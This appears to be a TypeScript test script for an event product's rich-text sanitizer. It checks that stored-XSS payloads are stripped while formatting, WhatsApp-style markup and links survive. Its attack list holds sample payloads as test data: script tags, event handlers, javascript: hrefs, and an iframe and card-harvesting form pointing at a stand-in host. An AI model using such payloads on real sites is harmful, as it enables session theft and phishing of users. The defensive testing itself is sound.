/**
 * The event description is the one field where admin input is rendered as markup to every
 * buyer, which makes it the only stored-XSS surface in the product. This suite is what
 * stops the allowlist quietly widening.
 *
 * Run:  npm run check:richtext
 */
import {
  sanitizeRichText,
  richTextToPlain,
  truncatePlain,
  ensureRichText,
  isRichTextEmpty,
} from "../lib/rich-text.ts";
import { whatsappToHtml } from "../lib/whatsapp-text.ts";

let failures = 0;

function check(name: string, pass: boolean, detail = "") {
  if (!pass) failures++;
  console.log(`  ${pass ? "PASS" : "FAIL"}  ${name}`);
  if (!pass && detail) console.log(`        ${detail}`);
}

console.log("\nStored XSS is stripped");
const attacks: [string, string][] = [
  ["script tag", `<p>Hi</p><script>alert(1)</script>`],
  ["img onerror", `<img src=x onerror="alert(1)">`],
  ["javascript: href", `<a href="javascript:alert(1)">tap</a>`],
  ["data: href", `<a href="data:text/html,<script>alert(1)</script>">tap</a>`],
  ["inline handler", `<p onclick="alert(1)">tap</p>`],
  ["iframe", `<iframe src="https://evil.test"></iframe>`],
  ["style tag", `<style>body{display:none}</style><p>Hi</p>`],
  ["svg onload", `<svg onload="alert(1)"></svg>`],
  ["credential-harvesting form", `<form action="https://evil.test"><input name="card"></form>`],
  ["protocol-relative link", `<a href="//evil.test">tap</a>`],
];
for (const [name, payload] of attacks) {
  const out = sanitizeRichText(payload);
  const unsafe =
    /<script|onerror|onclick|onload|javascript:|<iframe|<style|<form|<img|<svg/i.test(out) ||
    out.includes('href="//');
  check(name, !unsafe, JSON.stringify(out));
}

console.log("\nLegitimate formatting survives");
const good =
  `<h3>Day 1</h3><p><strong>Bold</strong> and <em>italic</em>.</p>` +
  `<ul><li>One</li></ul><a href="https://hapawards.com">site</a>`;
const clean = sanitizeRichText(good);
check("headings kept", clean.includes("<h3>"));
check("bold kept", clean.includes("<strong>"));
check("list kept", clean.includes("<li>"));
check("https link kept", clean.includes("hapawards.com"));
check("link carries noopener", clean.includes("noopener"), clean);
check("link opens in a new tab", clean.includes('target="_blank"'));
check("b is folded into strong", sanitizeRichText("<b>x</b>").includes("<strong>"));

const dial = sanitizeRichText(`<a href="tel:+18185659533" target="_blank">call</a>`);
check("tel link kept", dial.includes('href="tel:+18185659533"'), dial);
check("tel link opens no new tab", !dial.includes("_blank"), dial);

console.log("\nText pasted from WhatsApp keeps its formatting");
const wa = whatsappToHtml(
  "*For Bookings:*\nCall +1 (818) 565-9533 or tickets@hapawards.com\nhttp://www.hapawards.com\n\n_Limited Seats._",
);
check("*bold* becomes strong", wa.includes("<strong>For Bookings:</strong>"), wa);
check("_italic_ becomes em", wa.includes("<em>Limited Seats.</em>"), wa);
check("phone becomes a tel link", wa.includes('href="tel:+18185659533"'), wa);
check("email becomes a mailto link", wa.includes('href="mailto:tickets@hapawards.com"'), wa);
check("url becomes a link", wa.includes('href="http://www.hapawards.com"'), wa);
check("blank line splits paragraphs", wa.split("<p>").length === 3, wa);
const literal = whatsappToHtml("2*3*4 and snake_case_name, https://x.test/a_b_c");
check("markers inside words are left alone", !/<(strong|em)>/.test(literal), literal);
check("underscores in a URL survive", literal.includes('href="https://x.test/a_b_c"'), literal);
check("pasted markup is escaped", whatsappToHtml("<script>x</script>").includes("&lt;script"));
check(
  "survives sanitising",
  sanitizeRichText(wa).includes("<strong>") && sanitizeRichText(wa).includes("tel:"),
);

console.log("\nMetadata is plain prose, not markup");
const plain = richTextToPlain(good);
check("no angle brackets reach the meta tag", !plain.includes("<"), plain);
check("reads as sentences", plain.includes("Day 1") && plain.includes("Bold"), plain);
check("truncates on a word boundary", truncatePlain("a".repeat(50) + " " + "b".repeat(300), 80).length <= 81);

console.log("\nDescriptions written before the editor existed still render");
check(
  "blank lines become paragraphs",
  ensureRichText("First para.\n\nSecond para.") === "<p>First para.</p><p>Second para.</p>",
);
check("existing markup is left alone", ensureRichText("<p>Hi</p>") === "<p>Hi</p>");
check("legacy text is html-escaped", ensureRichText("5 < 6").includes("&lt;"));
check("markup with no words counts as empty", isRichTextEmpty("<p></p><p>  </p>"));

console.log(failures === 0 ? "\nAll checks passed." : `\n${failures} check(s) FAILED.`);
process.exit(failures === 0 ? 0 : 1);
